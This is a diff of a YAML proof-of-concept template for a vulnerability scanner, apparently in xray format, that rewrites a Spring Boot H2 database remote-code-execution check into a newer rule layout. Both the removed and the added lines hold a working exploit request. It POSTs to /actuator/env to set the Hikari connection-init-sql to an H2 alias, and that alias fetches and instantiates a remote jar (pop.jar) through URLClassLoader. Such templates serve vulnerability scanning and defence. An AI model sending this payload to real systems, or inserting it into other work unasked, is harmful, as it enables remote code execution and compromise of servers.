@@ -1,21 +1,24 @@
 name: poc-yaml-springboot-h2-db-rce
+manual: true
+transport: http
 rules:
-  - method: POST
-    path: /actuator/env
-    headers:
-      Content-Type: application/json
-    body: |
-      {
-              "name": "spring.datasource.hikari.connection-init-sql",
-              "value":"CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws Exception { Class.forName(\"pop\", true, new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:9001/pop.jar\")})).newInstance();return null;}$$; CALL remoteUrl()"
-            }
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(b"spring.datasource.hikari.connection-init-sql")
-
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /actuator/env
+            headers:
+                Content-Type: application/json
+            body: |
+                {
+                        "name": "spring.datasource.hikari.connection-init-sql",
+                        "value":"CREATE ALIAS remoteUrl AS $$ import java.net.*;@CODE String remoteUrl() throws Exception { Class.forName(\"pop\", true, new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:9001/pop.jar\")})).newInstance();return null;}$$; CALL remoteUrl()"
+                      }
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(b"spring.datasource.hikari.connection-init-sql")
+expression: r0()
 detail:
-  author: For3stCo1d
-  description: "SpingbootH2RCE"
-  links:
-    - https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
-    - https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/springboot/springboot-h2-db-rce.yaml
+    author: For3stCo1d
+    links:
+        - https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
+    description: SpingbootH2RCE
